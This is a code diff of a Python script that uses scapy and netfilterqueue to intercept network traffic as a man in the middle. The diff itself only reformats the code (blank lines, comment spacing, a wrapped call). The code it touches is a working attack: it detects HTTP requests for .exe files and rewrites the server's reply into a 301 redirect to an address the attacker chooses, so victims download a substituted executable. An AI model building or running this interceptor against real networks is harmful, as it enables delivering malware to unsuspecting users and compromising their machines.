@@ -3,6 +3,7 @@
 import scapy.all as scapy
 import netfilterqueue
 import queue
+
 queue = queue.Queue()
 
 ack_list = []
@@ -15,6 +16,7 @@ def set_load(packet, load):
     del packet[scapy.TCP].chksum
     return packet
 
+
 def rep_file(address):
     def process_packets(packet):
         scapy_packet = scapy.IP(packet.get_payload())
@@ -22,7 +24,7 @@ def rep_file(address):
             if scapy_packet[scapy.TCP].dport == 80:
                 # print("HTTP Request")
                 if ".exe" in scapy_packet[scapy.Raw].load:
-                    #and "192.168.43.128" not in scapy_packet[scapy.Raw].load
+                    # and "192.168.43.128" not in scapy_packet[scapy.Raw].load
                     ack_list.append(scapy_packet[scapy.TCP].ack)
                     # print("[+] exe Request")
             elif scapy_packet[scapy.TCP].sport == 80:
@@ -31,7 +33,9 @@ def rep_file(address):
                     ack_list.remove(scapy_packet[scapy.TCP].seq)
                     # print("[+] Replacing file")
                     # print(scapy_packet.show())
-                    modified_packet = set_load(scapy_packet, "\nHTTP/1.1 301 Moved Permanently\nLocation: " + address + "\n\n")
+                    modified_packet = set_load(
+                        scapy_packet, "\nHTTP/1.1 301 Moved Permanently\nLocation: " + address + "\n\n"
+                    )
 
                     packet.set_payload(str(modified_packet))
 
@@ -46,4 +50,4 @@ def run_fintercept(address):
         queue.run()
 
     except KeyboardInterrupt:
-        print ("\n[-] Quitting(File Intercept).................")
+        print("\n[-] Quitting(File Intercept).................")
